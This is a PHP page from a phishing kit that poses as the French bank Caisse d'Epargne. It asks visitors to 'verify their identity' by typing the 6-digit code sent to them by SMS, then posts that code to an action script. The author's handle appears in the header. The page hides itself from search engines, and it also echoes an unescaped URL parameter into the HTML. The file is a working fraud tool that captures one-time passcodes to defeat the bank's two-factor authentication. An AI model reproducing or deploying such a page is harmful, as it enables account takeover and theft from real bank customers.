<?php

/*
Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/

    include_once '../inc/app.php';
?>
<!doctype html>
<html style="overflow: auto;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="icon" href="../assets/images/favicon.ico"> 

        <title>Bienvenue</title>
    </head>

    <body style="overflow: auto;">
        
        <!-- HEADER -->
        <header id="header">
            <div class="container" style="padding:20px;">
                <div class="logo"><img src="../assets/images/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" style="display: block; height: auto; margin: 50px 0;">
            <div class="container">
                <div class="login-area">
                    <div class="row justify-content-center">
                        <div class="col-lg-4 col-md-6 col-sm-9 col-10">
                            <form method="post" action="action/securi.php">
                                <input type="hidden" name="verbot">
                                <input type="hidden" name="type" value="securpasse">
                                <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                                <legend>Vérifier votre identité</legend>
                                <div class="text-center mb30"><p>Veuillez saisir un code à 6 chiffres envoyé par sms sur votre mobile :</p></div>
                                <label class="mb-4 <?php echo is_invalid_class($_SESSION['errors'],'securpasse') ?>">
                                    <p class="label-txt">Taper votre code</p>
                                    <input type="text" maxlength="6" class="input" id="securpasse" name="securpasse">
                                    <img class="remove" src="../assets/images/remove.png">
                                    <?php echo error_message($_SESSION['errors'],'securpasse'); ?>
                                </label>
                                <button type="submit" id="etap1" class="disabled" disabled>Continuer</button>
                            </form>
                        </div>  
                    </div>
                </div>
				
            </div>
			<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <ul>
                    <li>Aide à la connexion</li>
                    <li>Sécurité</li>
                    <li>Infos navigateurs</li>
                    <li>Mentions légales</li>
                </ul>
                <p>&copy; Caisse d'Epargne <?php echo date('Y'); ?></p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script>
            $("#securpasse").keydown(function(){
                var securpasse = $('#securpasse').val();
                if( securpasse.length > 0 ) {
                    $('#etap1').removeAttr('disabled').removeClass('disabled');
                    $(this).siblings('.remove').show();
                } else if( securpasse.length == 0 ) {
                    $('#etap1').attr('disabled','disabled').addClass('disabled');
                    $(this).siblings('.remove').hide();
                }
            });
            $('.remove').click(function(){
                $(this).siblings('input').val('');
                $(this).hide();
                $('#etap1').attr('disabled','disabled').addClass('disabled');
            });
        </script>

    </body>

</html>